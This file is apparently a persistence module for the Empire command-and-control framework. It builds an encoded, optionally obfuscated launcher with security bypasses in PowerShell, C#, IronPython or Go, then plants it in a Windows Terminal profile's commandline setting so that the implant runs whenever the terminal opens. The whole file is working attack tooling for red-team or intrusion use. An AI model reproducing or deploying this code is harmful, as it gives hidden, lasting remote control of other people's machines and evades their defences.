from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        listener_name = params.get("Listener", "")
        language = params.get("Language", "powershell")
        obf = params.get("Obfuscate", "False").lower() == "true"
        obf_cmd = params.get("ObfuscateCommand", "")
        bypasses = params.get("Bypasses", "")
        user_agent = params.get("UserAgent", "default")
        proxy = params.get("Proxy", "default")
        proxy_creds = params.get("ProxyCreds", "default")
        profile_name = params.get("ProfileName", "")

        if not listener_name:
            raise ModuleValidationException("Listener is required.")

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        lang = language.lower()
        if lang == "powershell":
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=obf,
                obfuscation_command=obf_cmd,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=bypasses,
            )
        elif lang in ("csharp", "ironpython"):
            launcher = main_menu.stagergenv2.generate_exe_oneliner(
                language=lang,
                obfuscate=obf,
                obfuscation_command=obf_cmd,
                encode=True,
                listener_name=listener_name,
            )
        elif lang == "go":
            launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
                language=lang,
                obfuscate=obf,
                obfuscation_command=obf_cmd,
                encode=True,
                listener_name=listener_name,
            )
        else:
            raise ModuleValidationException(f"Language '{language}' not supported.")

        if not launcher or not launcher.strip():
            raise ModuleValidationException("[!] Error in launcher command generation.")

        # Escape single quotes for the PS single-quoted string in script_end.
        # The launcher is passed to Set-WindowsTerminalProfile -Command, which
        # injects it into the settings.json commandline field at runtime.
        escaped_launcher = launcher.replace("'", "''")
        escaped_profile = profile_name.replace("'", "''")

        script_end = f"Set-WindowsTerminalProfile -Command '{escaped_launcher}'"
        if profile_name:
            script_end += f" -ProfileName '{escaped_profile}'"

        return script, script_end
